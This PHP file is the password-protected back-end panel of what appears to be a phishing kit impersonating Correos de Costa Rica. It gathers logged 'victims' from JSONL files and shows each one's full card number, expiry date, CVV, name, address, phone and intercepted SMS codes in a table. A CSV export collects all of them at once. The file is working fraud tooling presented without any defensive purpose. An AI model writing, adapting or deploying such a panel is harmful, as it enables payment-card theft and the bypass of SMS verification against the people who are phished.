<?php
declare(strict_types=1);
require_once __DIR__ . '/../inc/functions.php';
session_name(SESSION_NAME);
session_start();

$authed = !empty($_SESSION['panel_ok']);
$err = '';

if (isset($_GET['logout'])) {
    unset($_SESSION['panel_ok']);
    header('Location: index.php');
    exit;
}
if (!$authed && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (hash_equals(PANEL_PASS, (string)($_POST['pass'] ?? ''))) {
        $_SESSION['panel_ok'] = true;
        $authed = true;
    } else {
        $err = 'Contraseña incorrecta.';
    }
}

if (!$authed) {
    ?>
    <!DOCTYPE html>
    <html lang="es">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Panel — Correos</title>
    <link rel="stylesheet" href="../assets/style.css">
    </head>
    <body>
    <div class="panel-login">
      <div class="card">
        <h2>Panel de control</h2>
        <?php if ($err !== '') { echo '<div class="error">' . h($err) . '</div>'; } ?>
        <form method="post" action="index.php">
          <label>Contraseña</label>
          <input type="password" name="pass" autofocus required>
          <button class="btn" type="submit">Entrar</button>
        </form>
      </div>
    </div>
    </body>
    </html>
    <?php
    exit;
}

// Collect victims from JSONL logs
$victims = [];
foreach (glob(VICTIMS_DIR . '/*.jsonl') ?: [] as $f) {
    $rows = [];
    foreach (file($f, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [] as $line) {
        $d = json_decode($line, true);
        if (is_array($d)) { $rows[] = $d; }
    }
    if (!$rows) { continue; }
    $card = null; $sms = []; $ip = ''; $start = ''; $events = [];
    foreach ($rows as $r) {
        $events[] = $r['event'] ?? '?';
        if (($r['event'] ?? '') === 'card')  { $card = $r; }
        if (($r['event'] ?? '') === 'sms')   { $sms[] = $r['sms'] ?? ''; }
        if (($r['event'] ?? '') === 'start' && $start === '') { $start = $r['ts'] ?? ''; }
        if ($ip === '' && !empty($r['ip'])) { $ip = $r['ip']; }
    }
    $victims[] = [
        'token'  => basename($f, '.jsonl'),
        'rows'   => $rows,
        'card'   => $card,
        'sms'    => $sms,
        'ip'     => $ip,
        'start'  => $start,
        'events' => $events,
    ];
}
usort($victims, function ($a, $b) {
    return strcmp($b['start'] ?? '', $a['start'] ?? '');
});

if (isset($_GET['export'])) {
    header('Content-Type: text/csv; charset=UTF-8');
    header('Content-Disposition: attachment; filename="victims.csv"');
    $out = fopen('php://output', 'w');
    fputcsv($out, ['token', 'fecha', 'ip', 'nombre', 'tarjeta', 'exp', 'cvv', 'direccion', 'provincia', 'canton', 'zip', 'telefono', 'sms', 'user_agent']);
    foreach ($victims as $v) {
        $c = $v['card'] ?? [];
        fputcsv($out, [
            $v['token'], $v['start'], $v['ip'],
            $c['card_name'] ?? '', $c['card_number'] ?? '', $c['card_exp'] ?? '', $c['card_cvv'] ?? '',
            $c['address'] ?? '', $c['province'] ?? '', $c['canton'] ?? '', $c['zip'] ?? '', $c['phone'] ?? '',
            implode(' | ', array_filter($v['sms'])),
            substr($v['rows'][0]['ua'] ?? '', 0, 200),
        ]);
    }
    fclose($out);
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Panel — Correos CR</title>
<link rel="stylesheet" href="../assets/style.css">
</head>
<body>
<div class="wrap wide">
  <div class="card">
    <h2>Panel de víctimas <span class="badge"><?php echo count($victims); ?></span></h2>
    <p class="lead">Registros recolectados del flujo. Exporte el CSV para revisión completa.</p>
    <a class="btn-small" href="index.php?export=1">Exportar CSV</a>
    <a class="btn-small warn" href="index.php?logout=1">Salir</a>
    <?php if (!$victims) { ?>
      <p class="info" style="margin-top:16px;">Aún no hay víctimas registradas.</p>
    <?php } else { ?>
    <table>
      <tr>
        <th>Fecha</th><th>IP</th><th>Nombre</th><th>Tarjeta</th><th>Exp</th><th>CVV</th>
        <th>Dirección</th><th>Provincia</th><th>Cantón</th><th>Zip</th><th>Teléfono</th><th>Códigos SMS</th><th>Eventos</th>
      </tr>
      <?php foreach ($victims as $v) {
          $c = $v['card'] ?? [];
          echo '<tr>';
          echo '<td class="mono">' . h($v['start']) . '</td>';
          echo '<td class="mono">' . h($v['ip']) . '</td>';
          echo '<td>' . h($c['card_name'] ?? '') . '</td>';
          echo '<td class="mono">' . h($c['card_number'] ?? '') . '</td>';
          echo '<td>' . h($c['card_exp'] ?? '') . '</td>';
          echo '<td>' . h($c['card_cvv'] ?? '') . '</td>';
          echo '<td>' . h($c['address'] ?? '') . '</td>';
          echo '<td>' . h($c['province'] ?? '') . '</td>';
          echo '<td>' . h($c['canton'] ?? '') . '</td>';
          echo '<td>' . h($c['zip'] ?? '') . '</td>';
          echo '<td>' . h($c['phone'] ?? '') . '</td>';
          echo '<td class="mono">' . h(implode(', ', $v['sms'])) . '</td>';
          echo '<td class="mono">' . h(implode(' → ', $v['events'])) . '</td>';
          echo '</tr>';
      } ?>
    </table>
    <?php } ?>
  </div>
</div>
</body>
</html>
